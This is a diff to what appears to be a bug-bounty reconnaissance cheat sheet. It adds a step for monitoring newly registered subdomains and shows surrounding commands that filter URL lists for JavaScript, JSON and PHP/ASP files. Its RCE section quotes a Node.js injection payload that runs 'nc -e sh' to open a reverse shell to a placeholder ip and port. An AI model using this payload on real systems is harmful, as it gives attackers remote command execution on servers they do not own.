@@ -54,6 +54,10 @@ cat urls.txt | grep ".json$" > jsonfiles.txt
 cat urls.txt | grep ".js$" > jsfiles.txt
 cat urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' > asphpfiles.txt
 ```
+7-get new registred subdomains
+```
+gungnir -r domain.txt | anew subdomains.txt | notify -v
+```
 # RCE
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
